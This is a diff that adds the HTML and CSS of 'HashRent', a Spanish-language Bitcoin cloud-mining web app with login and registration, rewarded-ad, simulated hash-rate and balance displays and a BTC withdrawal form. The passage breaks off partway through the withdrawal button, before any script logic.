@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>HashRent · Minería Cloud Bitcoin</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>emailjs.init("N7cjAK7Vm5SM_kHdA");</script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#020409;--bg2:#060c18;--bg3:#0a1225;--card:#07101f;--card2:#0c1830;
+  --border:#1a2f55;--border2:#243d6e;
+  --gold:#ffb800;--gold2:#ffe566;--gold3:#ff8c00;--gold-glow:rgba(255,184,0,.7);
+  --cyan:#00f5ff;--cyan2:#00bcd4;--cyan-glow:rgba(0,245,255,.6);
+  --green:#39ff14;--green2:#00c853;--green-glow:rgba(57,255,20,.5);
+  --pink:#ff2d78;--pink2:#ff6ba8;--pink-glow:rgba(255,45,120,.5);
+  --purple:#bf5fff;--red:#ff3d57;
+  --text:#ddeeff;--text2:#7a9cc8;--text3:#3a5070;
+  --radius:16px;--shadow:0 4px 40px rgba(0,0,0,.7);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;letter-spacing:.02em}
+a{color:inherit;text-decoration:none}
+button{cursor:pointer;border:none;outline:none;font-family:inherit}
+input,select{font-family:inherit;outline:none;border:none}
+
+/* BG */
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(0,245,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(0,245,255,.05) 1px,transparent 1px);
+  background-size:36px 36px;animation:gridPulse 6s ease-in-out infinite}
+@keyframes gridPulse{0%,100%{opacity:.5}50%{opacity:1}}
+.bg-glow{position:fixed;z-index:0;pointer-events:none;border-radius:50%;filter:blur(90px)}
+.bg-glow-1{width:600px;height:600px;background:radial-gradient(circle,var(--gold) 0%,transparent 70%);opacity:.1;top:-200px;right:-150px;animation:drift1 14s ease-in-out infinite}
+.bg-glow-2{width:500px;height:500px;background:radial-gradient(circle,var(--cyan) 0%,transparent 70%);opacity:.08;bottom:-150px;left:-150px;animation:drift2 11s ease-in-out infinite}
+.bg-glow-3{width:300px;height:300px;background:radial-gradient(circle,var(--pink) 0%,transparent 70%);opacity:.07;top:40%;left:30%;animation:drift3 9s ease-in-out infinite}
+@keyframes drift1{0%,100%{transform:translate(0,0)}50%{transform:translate(-40px,50px)}}
+@keyframes drift2{0%,100%{transform:translate(0,0)}50%{transform:translate(40px,-40px)}}
+@keyframes drift3{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-20px,20px) scale(1.2)}}
+.bg-scanlines{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px)}
+
+/* ══ AUTH SCREEN ══ */
+#authScreen{
+  position:fixed;inset:0;z-index:200;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(2,4,9,.97);backdrop-filter:blur(12px);
+  padding:16px;
+}
+.auth-box{
+  width:100%;max-width:400px;
+  background:var(--card2);
+  border:1px solid var(--border2);
+  border-radius:22px;
+  padding:36px 28px 28px;
+  box-shadow:0 30px 80px rgba(0,0,0,.9),0 0 0 1px rgba(255,184,0,.1);
+  position:relative;overflow:hidden;
+}
+.auth-box::before{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--gold),transparent);opacity:.5}
+.auth-logo{text-align:center;margin-bottom:28px}
+.auth-logo-icon{
+  width:56px;height:56px;border-radius:14px;margin:0 auto 12px;
+  background:linear-gradient(135deg,var(--gold3),var(--gold),var(--gold2));
+  display:flex;align-items:center;justify-content:center;font-size:1.8rem;
+  box-shadow:0 0 24px var(--gold-glow);
+}
+.auth-logo-title{font-family:'Orbitron',monospace;font-size:1.4rem;font-weight:900;
+  background:linear-gradient(90deg,var(--gold),var(--gold2),var(--cyan));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.auth-logo-sub{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:var(--cyan2);
+  letter-spacing:.18em;display:block;margin-top:4px}
+
+/* Tab switcher */
+.auth-tabs{display:flex;gap:0;margin-bottom:24px;border-radius:10px;overflow:hidden;border:1px solid var(--border)}
+.auth-tab{flex:1;padding:10px;text-align:center;
+  font-family:'Share Tech Mono',monospace;font-size:.7rem;letter-spacing:.12em;
+  background:transparent;color:var(--text3);transition:all .25s}
+.auth-tab.active{background:linear-gradient(135deg,var(--bg3),var(--card2));
+  color:var(--gold);box-shadow:inset 0 0 12px rgba(255,184,0,.1)}
+
+.auth-field{margin-bottom:14px}
+.auth-field label{font-family:'Share Tech Mono',monospace;font-size:.6rem;
+  letter-spacing:.15em;color:var(--text3);display:block;margin-bottom:6px}
+.auth-field input{
+  width:100%;padding:13px 16px;
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:10px;color:var(--text);font-size:.9rem;
+  transition:border-color .2s,box-shadow .2s;
+}
+.auth-field input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(0,245,255,.1)}
+.auth-field input::placeholder{color:var(--text3)}
+
+.btn-auth{
+  width:100%;padding:15px;margin-top:6px;
+  border-radius:12px;
+  font-family:'Orbitron',monospace;font-size:.82rem;font-weight:700;
+  letter-spacing:.08em;color:#000;
+  background:linear-gradient(135deg,var(--gold3),var(--gold),var(--gold2));
+  box-shadow:0 4px 24px rgba(255,184,0,.4);
+  transition:all .25s;position:relative;overflow:hidden;
+}
+.btn-auth:hover{transform:translateY(-2px);box-shadow:0 8px 36px rgba(255,184,0,.6)}
+.btn-auth:active{transform:translateY(0)}
+
+.auth-msg{margin-top:12px;padding:11px 14px;border-radius:10px;
+  font-family:'Share Tech Mono',monospace;font-size:.65rem;
+  display:none;letter-spacing:.05em}
+.auth-msg.error{background:rgba(255,45,120,.08);border:1px solid rgba(255,45,120,.3);color:var(--pink);display:block}
+.auth-msg.success{background:rgba(57,255,20,.08);border:1px solid rgba(57,255,20,.3);color:var(--green);display:block}
+
+/* ══ MAIN APP ══ */
+.app{position:relative;z-index:1;max-width:520px;margin:0 auto;padding:16px 12px 90px}
+
+/* HEADER */
+.header{display:flex;align-items:center;justify-content:space-between;padding:18px 0 22px}
+.logo{display:flex;align-items:center;gap:12px;font-family:'Orbitron',monospace;font-size:1.25rem;font-weight:900;letter-spacing:.08em}
+.logo-icon{width:42px;height:42px;border-radius:12px;
+  background:linear-gradient(135deg,var(--gold3),var(--gold),var(--gold2));
+  display:flex;align-items:center;justify-content:center;font-size:1.3rem;
+  box-shadow:0 0 20px var(--gold-glow);animation:iconPulse 2.5s ease-in-out infinite}
+@keyframes iconPulse{0%,100%{box-shadow:0 0 20px var(--gold-glow)}50%{box-shadow:0 0 40px var(--gold-glow)}}
+.logo-text{background:linear-gradient(90deg,var(--gold),var(--gold2),var(--cyan));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.logo-sub{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:var(--cyan2);
+  display:block;letter-spacing:.18em;-webkit-text-fill-color:var(--cyan2);margin-top:2px}
+.header-right{display:flex;align-items:center;gap:8px}
+.user-badge{font-family:'Share Tech Mono',monospace;font-size:.62rem;
+  color:var(--gold2);background:rgba(255,184,0,.08);
+  border:1px solid rgba(255,184,0,.2);border-radius:8px;padding:4px 10px}
+.btn-logout{font-family:'Share Tech Mono',monospace;font-size:.6rem;
+  color:var(--text3);background:var(--card2);border:1px solid var(--border);
+  border-radius:8px;padding:5px 10px;transition:all .2s}
+.btn-logout:hover{border-color:var(--pink);color:var(--pink)}
+
+.status-pill{display:flex;align-items:center;gap:8px;padding:6px 14px;border-radius:99px;
+  background:var(--card2);border:1px solid var(--border);
+  font-family:'Share Tech Mono',monospace;font-size:.68rem;color:var(--text3);transition:all .4s}
+.status-pill.mining-active{border-color:var(--green);box-shadow:0 0 14px rgba(57,255,20,.25);color:var(--green)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--text3);transition:all .4s;flex-shrink:0}
+.dot.active{background:var(--green);box-shadow:0 0 10px var(--green);animation:blink 1s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* CARDS */
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:18px;margin-bottom:12px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,.03) 0%,transparent 50%);pointer-events:none}
+.card::after{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan2),transparent);opacity:.4}
+.card-title{font-family:'Share Tech Mono',monospace;font-size:.62rem;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--text3);margin-bottom:12px;display:flex;align-items:center;gap:8px}
+
+/* BALANCE */
+.balance-card{background:linear-gradient(135deg,#071424 0%,#040d1a 100%);border-color:rgba(255,184,0,.3);padding:22px 20px}
+.balance-card::after{background:linear-gradient(90deg,transparent,var(--gold),transparent);opacity:.3}
+.balance-glow-bg{position:absolute;top:-60px;right:-60px;width:200px;height:200px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,184,0,.15) 0%,transparent 70%);pointer-events:none}
+.balance-amount{font-family:'Orbitron',monospace;font-size:1.5rem;font-weight:900;line-height:1;
+  color:var(--gold2);text-shadow:0 0 30px var(--gold-glow);word-break:break-all;transition:all .3s}
+.balance-amount.flash{animation:balFlash .5s ease}
+@keyframes balFlash{0%,100%{}40%{text-shadow:0 0 60px #fff,0 0 100px var(--gold);color:#fff}}
+.balance-unit{font-family:'Orbitron',monospace;font-size:.9rem;color:var(--gold);margin-left:8px;font-weight:700}
+
+/* STATS */
+.stats-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:14px 16px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.stat-card::after{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan2),transparent);opacity:.3}
+.stat-card.full{grid-column:1 / -1}
+.stat-val{font-family:'Orbitron',monospace;font-size:1.5rem;font-weight:700;line-height:1.1}
+.stat-val.cyan{color:var(--cyan);text-shadow:0 0 20px var(--cyan-glow)}
+.stat-val.green{color:var(--green);text-shadow:0 0 20px var(--green-glow)}
+.stat-val.gold{color:var(--gold);text-shadow:0 0 20px var(--gold-glow);font-size:1.1rem}
+.stat-label{font-family:'Share Tech Mono',monospace;font-size:.58rem;letter-spacing:.18em;
+  text-transform:uppercase;color:var(--text3);margin-bottom:6px}
+.stat-sub{font-family:'Share Tech Mono',monospace;font-size:.55rem;color:var(--text3);margin-top:4px}
+
+/* MINING DISPLAY */
+.mining-display{background:var(--bg2);border:1px solid var(--border);border-radius:10px;
+  padding:12px;font-family:'Share Tech Mono',monospace;font-size:.63rem;
+  color:var(--cyan2);height:86px;overflow:hidden;position:relative}
+.mining-display .line{margin-bottom:3px;animation:fadeLine 5s ease forwards;opacity:0}
+.mining-display .line.ok{color:var(--green)}
+.mining-display .line.err{color:var(--pink2)}
+@keyframes fadeLine{0%{opacity:0;transform:translateX(-6px)}10%{opacity:1;transform:translateX(0)}75%{opacity:1}100%{opacity:0}}
+.mining-inactive{color:var(--text3);display:flex;align-items:center;justify-content:center;
+  height:100%;font-size:.72rem;letter-spacing:.15em;flex-direction:column;gap:6px}
+.mining-inactive-icon{font-size:1.4rem;opacity:.4}
+
+/* AD BUTTON */
+.ad-section{margin-bottom:12px}
+.btn-ad{width:100%;padding:0;border-radius:var(--radius);position:relative;overflow:hidden;
+  display:flex;align-items:stretch;
+  box-shadow:0 0 0 1px rgba(255,184,0,.4),0 4px 30px rgba(255,184,0,.4);
+  transition:all .25s;animation:adPulse 3s ease-in-out infinite}
+@keyframes adPulse{
+  0%,100%{box-shadow:0 0 0 1px rgba(255,184,0,.4),0 4px 30px rgba(255,184,0,.4)}
+  50%{box-shadow:0 0 0 2px rgba(255,184,0,.7),0 6px 50px rgba(255,184,0,.6)}}
+.btn-ad:hover:not(:disabled){transform:translateY(-3px);animation:none;
+  box-shadow:0 0 0 2px var(--gold2),0 10px 50px rgba(255,184,0,.7)}
+.btn-ad:disabled{opacity:.45;cursor:not-allowed;transform:none;animation:none;box-shadow:none}
+.btn-ad-stripe{width:8px;background:linear-gradient(180deg,var(--gold2),var(--gold3),var(--gold));flex-shrink:0}
+.btn-ad-body{flex:1;background:linear-gradient(135deg,#1a0e00 0%,#2a1800 40%,#1a0e00 100%);
+  padding:18px 20px;display:flex;align-items:center;gap:14px}
+.btn-ad-icon{width:48px;height:48px;border-radius:12px;
+  background:linear-gradient(135deg,var(--gold3),var(--gold),var(--gold2));
+  display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;
+  box-shadow:0 0 16px rgba(255,184,0,.5)}
+.btn-ad-content{flex:1;text-align:left}
+.btn-ad-title{font-family:'Orbitron',monospace;font-size:.88rem;font-weight:700;
+  color:var(--gold2);letter-spacing:.06em;text-shadow:0 0 12px rgba(255,184,0,.5);display:block;margin-bottom:3px}
+.btn-ad-sub{font-family:'Share Tech Mono',monospace;font-size:.62rem;color:var(--text2);letter-spacing:.08em}
+.btn-ad-reward{display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0}
+.btn-ad-reward-val{font-family:'Orbitron',monospace;font-size:1.1rem;font-weight:900;
+  color:var(--gold);text-shadow:0 0 14px var(--gold-glow)}
+.btn-ad-reward-lbl{font-family:'Share Tech Mono',monospace;font-size:.55rem;color:var(--gold3);letter-spacing:.1em}
+.btn-ad-shimmer{position:absolute;inset:0;
+  background:linear-gradient(105deg,transparent 0%,transparent 40%,rgba(255,230,100,.12) 50%,transparent 60%,transparent 100%);
+  transform:translateX(-100%);animation:shimmerLoop 4s ease-in-out infinite}
+@keyframes shimmerLoop{0%,100%{transform:translateX(-100%)}45%,55%{transform:translateX(100%)}}
+.ad-info-row{display:flex;align-items:center;justify-content:space-between;margin-top:8px;padding:0 4px}
+.ad-cooldown{font-family:'Share Tech Mono',monospace;font-size:.65rem;color:var(--text3);min-height:18px}
+.ad-admob-tag{font-family:'Share Tech Mono',monospace;font-size:.55rem;color:var(--text3);opacity:.5;letter-spacing:.1em}
+
+/* AD MODAL */
+.modal-overlay{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.92);backdrop-filter:blur(8px);
+  display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .35s}
+.modal-overlay.open{opacity:1;pointer-events:all}
+.modal{background:var(--card2);border:1px solid var(--border2);border-radius:22px;
+  padding:36px 28px 28px;width:92%;max-width:340px;text-align:center;
+  transform:scale(.85) translateY(20px);transition:transform .35s cubic-bezier(.34,1.56,.64,1);
+  box-shadow:0 30px 80px rgba(0,0,0,.8)}
+.modal-overlay.open .modal{transform:scale(1) translateY(0)}
+.modal::before{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--gold),transparent);opacity:.5}
+.admob-placeholder{width:100%;min-height:150px;background:linear-gradient(135deg,#0a1a2e,#050e1c);
+  border:1px dashed var(--border2);border-radius:12px;
+  display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;margin-bottom:20px}
+.admob-icon{font-size:2.5rem;opacity:.3}
+.admob-label{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:var(--text3);letter-spacing:.2em}
+.modal-title{font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;
+  color:var(--gold2);margin-bottom:6px;letter-spacing:.06em;text-shadow:0 0 16px rgba(255,184,0,.4)}
+.modal-sub{font-size:.82rem;color:var(--text2);margin-bottom:20px;line-height:1.6}
+.ad-timer-bar{height:6px;background:var(--bg);border-radius:99px;overflow:hidden;margin-bottom:14px;border:1px solid var(--border)}
+.ad-timer-fill{height:100%;background:linear-gradient(90deg,var(--gold3),var(--gold),var(--gold2));
+  border-radius:99px;width:0%;transition:width .1s linear;box-shadow:0 0 8px var(--gold-glow)}
+.ad-timer-text{font-family:'Orbitron',monospace;font-size:2rem;font-weight:900;
+  color:var(--gold);margin-bottom:8px;text-shadow:0 0 20px var(--gold-glow)}
+.ad-skip{font-family:'Share Tech Mono',monospace;font-size:.65rem;color:var(--text3);letter-spacing:.1em}
+
+/* PROGRESS */
+.progress-wrap{margin-top:10px}
+.progress-labels{display:flex;justify-content:space-between;
+  font-family:'Share Tech Mono',monospace;font-size:.6rem;color:var(--text2);margin-bottom:6px}
+.progress-bar{height:10px;background:var(--bg2);border-radius:99px;overflow:hidden;border:1px solid var(--border)}
+.progress-fill{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--green2),var(--green));
+  box-shadow:0 0 12px var(--green-glow);transition:width .6s ease;min-width:3px;position:relative}
+.progress-fill::after{content:'';position:absolute;right:0;top:-2px;bottom:-2px;width:4px;
+  border-radius:99px;background:#fff;box-shadow:0 0 8px var(--green);opacity:.8}
+.progress-pct{font-family:'Share Tech Mono',monospace;text-align:right;font-size:.62rem;color:var(--green);margin-top:5px}
+
+/* WITHDRAWAL */
+.input-group{margin-bottom:12px}
+.input-label{font-family:'Share Tech Mono',monospace;font-size:.6rem;letter-spacing:.15em;
+  text-transform:uppercase;color:var(--text3);margin-bottom:6px;display:block}
+.input-field{width:100%;padding:13px 16px;background:var(--bg2);border:1px solid var(--border);
+  border-radius:10px;color:var(--text);font-size:.85rem;transition:border-color .2s,box-shadow .2s;
+  font-family:'Share Tech Mono',monospace}
+.input-field:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(0,245,255,.12)}
+.input-field::placeholder{color:var(--text3)}
+
+select.input-field{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%233a5070' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 14px center;padding-right:36px}
+select.input-field option{background:var(--bg2);color:var(--text)}
+
+.btn-withdraw{width:100%;padding:15px;border-radius:12px;
+  font-family:'Orbitron',monospace;font-size:.82rem;font-weight:700;color:#000;letter-spacing:.08em;
+  background:linear-gradient(135deg,#003d1f,var(--green2),#00ff7a);
+  box-shadow:0 4px 20px rgba(57,255,20,.3);transition:all .25s;position:relative;overflow:hidden}
+.btn-withdraw:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 30px rgba(57,255,20,.5)}
+.btn-withdraw:disabled{opacity:.35;cursor:not-allowed}
+
+.msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:.75rem;display:none;
+  font-family:'Share Tech Mono',monospace;line-height:1.5}
+.msg.success{background:rgba(57,255,20,.08);border:1px solid rgba(57,255,20,.3);color:var(--green);display:block}
+.msg.error{background:rgba(255,45,120,.08);border:1px solid rgba(255,45,120,.3);color:var(--pink);display:block}
+.msg.info{background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.3);color:var(--cyan);display:block}
+
+/* CHART */
+canvas#earningsChart{width:100% !important;border-radius:8px}
+.chart-labels{display:flex;justify-content:space-between;margin-top:8px;
+  font-family:'Share Tech Mono',monospace;font-size:.6rem;color:var(--text3)}
+
+/* HISTORY */
+.history-list{max-height:220px;overflow-y:auto}
+.history-list::-webkit-scrollbar{width:3px}
+.history-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}
+.history-item{display:flex;align-items:flex-start;gap:12px;
+  padding:10px 0;border-bottom:1px solid rgba(26,47,85,.4);font-size:.78rem}
+.history-item:last-child{border-bottom:none}
+.history-icon{font-size:1.1rem;flex-shrink:0;margin-top:2px}
+.history-desc{color:var(--text);line-height:1.45;font-weight:500}
+.history-time{font-family:'Share Tech Mono',monospace;color:var(--text3);font-size:.58rem;display:block;margin-top:3px}
+.history-empty{font-family:'Share Tech Mono',monospace;color:var(--text3);font-size:.72rem;
+  text-align:center;padding:24px 0;letter-spacing:.15em}
+
+/* PARTICLES */
+.particle{position:fixed;pointer-events:none;z-index:50;
+  font-family:'Orbitron',monospace;font-size:.68rem;font-weight:700;
+  color:var(--gold2);text-shadow:0 0 10px var(--gold);animation:floatUp 1.5s ease forwards}
+@keyframes floatUp{0%{opacity:1;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-90px) scale(.4)}}
+
+/* TABS */
+.tab-row{display:flex;gap:6px;margin-bottom:14px}
+.tab-btn{padding:7px 16px;border-radius:8px;
+  font-family:'Share Tech Mono',monospace;font-size:.64rem;font-weight:700;
+  letter-spacing:.12em;text-transform:uppercase;background:transparent;
+  border:1px solid var(--border);color:var(--text3);transition:all .2s}
+.tab-btn.active{background:linear-gradient(135deg,var(--bg3),var(--card2));
+  border-color:var(--cyan2);color:var(--cyan);box-shadow:0 0 10px rgba(0,245,255,.15)}
+
+/* WITHDRAW AMOUNT PREVIEW */
+.withdraw-preview{
+  background:var(--bg2);border:1px solid var(--border);border-radius:10px;
+  padding:12px 16px;margin-bottom:12px;
+  font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--text2);
+}
+.withdraw-preview-val{color:var(--gold2);font-size:.9rem;font-weight:700}
+
+@media(max-width:360px){.balance-amount{font-size:1.2rem}.stat-val{font-size:1.3rem}}
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-scanlines"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+<div class="bg-glow bg-glow-3"></div>
+
+<!-- ══════════════════════════════════════
+     PANTALLA DE AUTH
+══════════════════════════════════════ -->
+<div id="authScreen">
+  <div class="auth-box">
+    <div class="auth-logo">
+      <div class="auth-logo-icon">₿</div>
+      <div class="auth-logo-title">HashRent</div>
+      <span class="auth-logo-sub">Cloud Mining Network</span>
+    </div>
+
+    <div class="auth-tabs">
+      <button class="auth-tab active" id="tabLogin" onclick="switchAuthTab('login')">INICIAR SESIÓN</button>
+      <button class="auth-tab" id="tabRegister" onclick="switchAuthTab('register')">REGISTRARSE</button>
+    </div>
+
+    <!-- LOGIN -->
+    <div id="formLogin">
+      <div class="auth-field">
+        <label>NOMBRE DE CUENTA</label>
+        <input type="text" id="loginUser" placeholder="tu_nombre" autocomplete="username">
+      </div>
+      <div class="auth-field">
+        <label>CONTRASEÑA</label>
+        <input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password">
+      </div>
+      <button class="btn-auth" onclick="doLogin()">⚡ ENTRAR</button>
+    </div>
+
+    <!-- REGISTER -->
+    <div id="formRegister" style="display:none">
+      <div class="auth-field">
+        <label>NOMBRE DE CUENTA</label>
+        <input type="text" id="regUser" placeholder="elige_un_nombre" autocomplete="username">
+      </div>
+      <div class="auth-field">
+        <label>CONTRASEÑA</label>
+        <input type="password" id="regPass" placeholder="mínimo 6 caracteres" autocomplete="new-password">
+      </div>
+      <div class="auth-field">
+        <label>CONFIRMAR CONTRASEÑA</label>
+        <input type="password" id="regPass2" placeholder="repite la contraseña" autocomplete="new-password">
+      </div>
+      <button class="btn-auth" onclick="doRegister()">🚀 CREAR CUENTA</button>
+    </div>
+
+    <div class="auth-msg" id="authMsg"></div>
+  </div>
+</div>
+
+<!-- AD MODAL -->
+<div class="modal-overlay" id="adModal">
+  <div class="modal">
+    <div class="modal-title">⚡ ANUNCIO RECOMPENSADO</div>
+    <div class="modal-sub">Mira el anuncio completo para ganar<br>
+      <strong style="color:var(--gold);font-family:'Orbitron',monospace;">+3 MIN DE HASH</strong></div>
+    <div class="admob-placeholder" id="admobContainer">
+      <div class="admob-icon">📺</div>
+      <div class="admob-label">ADMOB AD UNIT</div>
+    </div>
+    <div class="ad-timer-text" id="adTimerText">30</div>
+    <div class="ad-timer-bar"><div class="ad-timer-fill" id="adTimerFill"></div></div>
+    <div class="ad-skip" id="adSkipText">NO PUEDES OMITIR ESTE ANUNCIO</div>
+  </div>
+</div>
+
+<!-- ══ APP ══ -->
+<div class="app" id="mainApp" style="display:none">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="logo">
+      <div class="logo-icon">₿</div>
+      <div>
+        <span class="logo-text">HashRent</span>
+        <span class="logo-sub">Cloud Mining Network</span>
+      </div>
+    </div>
+    <div class="header-right">
+      <div class="user-badge" id="userBadge">—</div>
+      <button class="btn-logout" onclick="doLogout()">SALIR</button>
+    </div>
+  </div>
+
+  <!-- STATUS -->
+  <div style="display:flex;justify-content:flex-end;margin-bottom:10px;">
+    <div class="status-pill" id="statusPill">
+      <div class="dot" id="statusDot"></div>
+      <span id="statusTxt">OFFLINE</span>
+    </div>
+  </div>
+
+  <!-- BALANCE -->
+  <div class="card balance-card" style="margin-bottom:12px">
+    <div class="balance-glow-bg"></div>
+    <div class="card-title" style="margin-bottom:8px">💰 SALDO ACUMULADO</div>
+    <div style="display:flex;align-items:baseline;gap:6px;flex-wrap:wrap">
+      <div class="balance-amount" id="balanceDisplay">0.000000000000000</div>
+      <span class="balance-unit">BTC</span>
+    </div>
+  </div>
+
+  <!-- STATS -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-label">⚡ Hash Rate</div>
+      <div class="stat-val cyan" id="hashRateDisplay">0</div>
+      <div class="stat-sub">GH/s simulado</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">⏱ Hash Time</div>
+      <div class="stat-val green" id="timeDisplay">00:00</div>
+      <div class="stat-sub">restante</div>
+    </div>
+    <div class="stat-card full">
+      <div class="stat-label">⏳ Total Minado</div>
+      <div class="stat-val gold" id="totalMined">0m 0s</div>
+      <div class="stat-sub">tiempo acumulado</div>
+    </div>
+  </div>
+
+  <!-- MINING -->
+  <div class="card" style="padding:14px 16px;margin-bottom:12px">
+    <div class="card-title">🔧 ACTIVIDAD DE MINERÍA</div>
+    <div class="mining-display" id="miningDisplay">
+      <div class="mining-inactive" id="miningInactive">
+        <span class="mining-inactive-icon">⛏</span>
+        <span>[ HASH ENGINE OFFLINE ]</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- AD BUTTON -->
+  <div class="ad-section">
+    <button class="btn-ad" id="btnAd" onclick="startAd()">
+      <div class="btn-ad-stripe"></div>
+      <div class="btn-ad-body">
+        <div class="btn-ad-icon">📺</div>
+        <div class="btn-ad-content">
+          <span class="btn-ad-title">VER ANUNCIO</span>
+          <span class="btn-ad-sub">Anuncio recompensado · AdMob</span>
+        </div>
+        <div class="btn-ad-reward">
+          <span class="btn-ad-reward-val">+3</span>
+          <span class="btn-ad-reward-lbl">MIN HASH</span>
+        </div>
+      </div>
+      <div class="btn-ad-shimmer"></div>
+    </button>
+    <div class="ad-info-row">
+      <div class="ad-cooldown" id="cooldownTxt"></div>
+      <div class="ad-admob-tag">POWERED BY ADMOB</div>
+    </div>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="card">
+    <div class="card-title">🎯 OBJETIVO DE RETIRO</div>
+    <div class="progress-wrap">
+      <div class="progress-labels">
+        <span>0 sats</span>
+        <span>10,000 sats (0.0001 BTC)</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill" style="width:0%"></div>
+      </div>
+      <div class="progress-pct" id="progressPct">0.0% completado</div>
+    </div>
+    <div style="font-family:'Share Tech Mono',monospace;font-size:.68rem;color:var(--text2);margin-top:10px">
+      Faltan: <span style="color:var(--gold)" id="satsNeeded">10,000</span> sats
+    </div>
+  </div>
+
+  <!-- CHART -->
+  <div class="card">
+    <div class="card-title">📈 GANANCIAS (últimos 60s)</div>
+    <canvas id="earningsChart" height="100"></canvas>
+    <div class="chart-labels">
+      <span>Ganancia/min: <span style="color:var(--green)" id="perMinDisplay">0</span> sats</span>
+      <span>Sesión: <span style="color:var(--gold)" id="sessionGain">0</span> sats</span>
+    </div>
+  </div>
+
+  <!-- WITHDRAWAL -->
+  <div class="card">
+    <div class="card-title">🏦 SOLICITAR RETIRO</div>
+
+    <div class="input-group">
+      <label class="input-label" for="btcAddress">Dirección Bitcoin (BTC)</label>
+      <input class="input-field" id="btcAddress" type="text"
+        placeholder="bc1q... o 1... o 3..." maxlength="62">
+    </div>
+
+    <div class="input-group">
+      <label class="input-label" for="withdrawAmount">Cantidad a retirar (BTC)</label>
+      <select class="input-field" id="withdrawAmount">
+        <option value="">-- Selecciona monto --</option>
+        <option value="0.0001">0.0001 BTC (mínimo)</option>
+        <option value="0.0002">0.0002 BTC</option>
+        <option value="0.0005">0.0005 BTC</option>
+        <option value="0.001">0.001 BTC</option>
+        <option value="0.005">0.005 BTC</option>
+        <option value="0.01">0.01 BTC</option>
+        <option value="custom">Otro monto...</option>
+      </select>
+    </div>
+
+    <div class="input-group" id="customAmountGroup" style="display:none">
+      <label class="input-label" for="customAmount">Monto personalizado (BTC)</label>
+      <input class="input-field" id="customAmount" type="number"
+        placeholder="ej. 0.00035" step="0.00001" min="0.0001">
+    </div>
+
+    <div class="withdraw-preview" id="withdrawPreview" style="display:none">
+      Monto seleccionado: <span class="withdraw-preview-val" id="previewVal">—</span> BTC
+      · disponible: <span style="color:var(--green)" id="previewBal">0</span> BTC
+    </div>
+
+    <button class="btn-withdraw" id="btnWithdraw" onclick="requestWithdraw()">
+      💸 SOLICITAR RETIRO
